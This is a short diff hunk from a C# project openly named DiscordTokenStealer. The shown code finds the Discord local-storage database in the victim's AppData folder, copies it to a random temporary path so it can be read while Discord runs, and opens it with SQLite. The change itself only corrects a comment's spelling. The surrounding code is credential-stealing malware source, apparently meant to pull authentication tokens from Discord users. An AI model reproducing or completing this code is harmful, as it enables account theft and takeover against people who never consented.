@@ -19,7 +19,7 @@ namespace DiscordTokenStealer
             string db_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\https_discordapp.com_0.localstorage"; //Open discord database
             string db_temp_path = Path.GetDirectoryName(db_path) + "\\" + rnd.Next(0, 999); //We are generating path for copy of database file because we are unable to use database when discord running 
 
-            File.Copy(db_path, db_temp_path); //copy database to our tempolary database path
+            File.Copy(db_path, db_temp_path); //copy database to our temporary path
 
             SQLiteConnection sqlconn = new SQLiteConnection("Data Source=" + db_temp_path + ";version=3;Pooling=False"); //prepare sql connection 
 
